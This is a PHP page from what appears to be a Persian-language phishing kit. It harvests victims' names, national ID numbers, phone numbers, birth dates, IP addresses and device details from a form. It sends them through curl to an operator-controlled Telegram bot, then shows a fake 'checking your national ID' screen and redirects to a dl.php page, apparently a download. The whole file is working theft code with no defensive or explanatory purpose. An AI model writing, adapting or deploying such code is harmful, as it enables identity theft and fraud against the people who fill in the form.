<?php

include_once 'os.php';

function GetIp()
{
    $ip = $_SERVER['REMOTE_ADDR'];
    return $ip;
}
$ip = GetIp();
$Device = rtrim(explode(' ',$_SERVER['HTTP_USER_AGENT'])[4],")");
$fullname = $_POST["name"];
$codemeli = $_POST["cm"];
$number = $_POST["number"];
$bdy =$_POST["bdy"];
$bdm = $_POST["bdm"];
$bdd =$_POST["bdd"];

    
$msg = "  
🥷ɴᴇᴡ ʟᴏɢɪɴ ɢᴜʏꜱ
-- - -- - -- - -- - -- - -- - --
🏴‍☠️ɴᴀᴍᴇ :
<code>$fullname</code>

📞ᴘʜᴏɴᴇ : 
<code>$number</code>

🪪ᴄ.ᴍᴇʟʟɪ : 
<code>$codemeli</code>
-- - -- - -- - -- - -- - -- - --
📅ᴛᴀᴠᴀʟᴏᴅ :
ʏᴇᴀʀ : $bdy
ᴍᴏɴᴛʜ : $bdm 
ᴅᴀʏ : $bdd
-- - -- - -- - -- - -- - -- - --
🌐ɪᴘ : <code>$ip</code>
-- - -- - -- - -- - -- - -- - --
@New_DeraGon
";
   $msg = strtr($msg, array(
        '۰' => '0',
        '۱' => '1',
        '۲' => '2',
        '۳' => '3',
        '۴' => '4',
        '۵' => '5',
        '۶' => '6',
        '۷' => '7',
        '۸' => '8',
        '۹' => '9',
        '٠' => '0',
        '١' => '1',
        '٢' => '2',
        '٣' => '3',
        '٤' => '4',
        '٥' => '5',
        '٦' => '6',
        '٧' => '7',
        '٨' => '8',
        '٩' => '9'
    ));
        if (!empty($token) && !empty($id))
    $key = json_encode(['inline_keyboard'=>[
        [['text'=>"$Device",'callback_data'=>"kos"]],
        [['text'=>" ᴅᴇᴠ ", 'url'=>"https://t.me/cardotp"]],
    ]]);
    if (!empty($token) && !empty($id))
    $send = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($msg) . '&parse_mode=HTML' . '&reply_markup=" . $key . "' ;
    $params = [
'chat_id' => $id,
'reply_markup' => $key,
'text' => $msg,
'parse_mode' => 'HTML'
];
    $website = "https://api.telegram.org/bot" . $token;
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
?>
<!DOCTYPE html>
<html



<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
<meta charset="utf-8" />
<head>


<body>

<script type="text/javascript">

function checkCodeMeli()
{
	var code = document.getElementById("c").value;
	var L = code.length;

	if( L < 8 || parseInt(code , 10) == 0) return false;

	code = ('0000' + code).substr( L + 4 - 10);

	if(parseInt(code.substr(3, 6), 10) == 0) return false;

	var c = parseInt(code.substr(9, 1), 10);
	var s = 0;
	for(var i = 0; i < 9; i++)
	s += parseInt(code.substr(i, 1), 10) * (10 - i);
	s = s % 11;
	return (s < 2 && c == s) || (s >= 2 && c == (11 - s));

	return true;

}

    window.addEventListener("load", () => {
        if(checkCodeMeli()) window.location.href = "./dl.php"; else alert('کد ملی وارد شده صحیح نمی باشد .'), window.location.href = "./index.php"
    });

</script>

<center>
<img src="IMG/madaret.gif" width="120" height="120">
</center>
<br>
<br>
<br>
<br>
<style>
@font-face {
    font-family: myFont;
    src: url('Fonts/Shabnam-FD.ttf');
}
body {
    font-family: myFont;
}

  h3 {
   text-align: center;
   color: #000080;
  }
</style>

<center>
     <h3>در حال بررسی کد ملی   <?php echo $codemeli; ?> </h3>
     <input type="hidden" name="c" id="c" value="<?php echo $codemeli; ?>">
</center>


</head>

</html>